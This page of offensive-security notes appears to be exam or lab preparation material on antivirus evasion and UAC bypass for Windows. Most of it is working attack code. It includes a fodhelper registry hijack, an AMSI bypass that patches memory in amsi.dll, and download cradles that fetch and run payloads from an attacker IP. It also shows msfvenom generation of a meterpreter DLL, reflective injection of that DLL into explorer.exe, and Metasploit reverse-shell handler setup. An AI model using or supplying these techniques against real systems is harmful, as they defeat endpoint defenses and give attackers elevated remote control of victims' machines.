---
title: UAC
layout: default
parent: Antivirus Evasion
nav_order: 3
---

## Powershell

Please note that this only works in Powershell (not from Word Macro)

Use the following as a powershell script(amsi is AMSI bypass, shell3 is the shell):

```
$cm = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.243/amsi.txt') | iex;(New-Object System.Net.WebClient).DownloadString('http://192.168.45.243/shell3.txt') | iex;Start-Sleep -Seconds 99999;"
$cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cm)) 
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -EncodedCommand $cmd" -Force 
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe
```

Prepare for shell (different, take note!)
```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
exploit
```


## Powershell to load C# DLL:

1. Generate msfvenom with:\
`sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT -f dll -o /var/www/html/met.dll`

2. Ready Apache2:\
`sudo systemctl restart apache2`

3. Put Invoke-ReflectivePEInjection.ps1 into /var/www/html.

4. Put the following script as shelldll.txt

```
$scriptUrl = "http://192.168.45.160/Invoke-ReflectivePEInjection.ps1"

$scriptContent = (New-Object System.Net.WebClient).DownloadString($scriptUrl)

Invoke-Expression $scriptContent

$bytes = (New-Object System.Net.WebClient).DownloadData("http://192.168.45.160/met.dll")
$procid = (Get-Process -Name explorer).Id

Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

5. Put the following as amsi.txt (AMSI bypass):
```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*ailed") {$f=$e}};$f.SetValue($null, (1 -eq 1))

function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0x48, 0x31, 0xC0) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```

6\. Use the following script so that it will auto execute (can ignore error):

```
$cm = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.245/amsi.txt') | iex;(New-Object System.Net.WebClient).DownloadString('http://192.168.45.245/shelldll.txt') | iex;Start-Sleep -Seconds 99999;"
$cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cm)) 
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe -EncodedCommand $cmd" -Force 
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
C:\Windows\System32\fodhelper.exe
```



7\. Prepare for shell (different, take note!)
```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
exploit
```
